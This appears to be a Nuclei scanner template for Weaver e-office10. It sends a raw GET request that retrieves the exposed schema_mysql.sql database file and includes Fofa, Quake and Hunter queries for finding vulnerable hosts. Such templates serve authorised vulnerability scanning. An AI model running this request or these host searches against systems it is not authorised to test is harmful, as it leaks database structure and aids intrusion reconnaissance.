id: Weaver_eoffice10_sql_link

info:
  name: Weaver_eoffice10_sql_link
  author: HK
  severity: low
  description: 泛微e-office10系统schema_mysql.sql敏感信息泄露漏洞
  metadata:
    max-request: 1
    Fofa-query: body="eoffice_loading_tip" OR body="eoffice10"
    QUake-query: body="eoffice_loading_tip" OR body="eoffice10"
    Hunter-query: body="eoffice_loading_tip" OR body="eoffice10"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /eoffice10/empty_scene/db/schema_mysql.sql HTTP/1.1
    Host: {{Hostname}}
    Pragma:no-cache
    Cache-Control:no-cache
    Upgrade-Insecure-Requests:1
    User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36
    Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding:gzip,deflate
    Accept-Language:zh-CN,zh;q=0.9,en;q=0.8
    Connection:close
    Content-Type:application/x-www-form-urlencoded

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - CREATE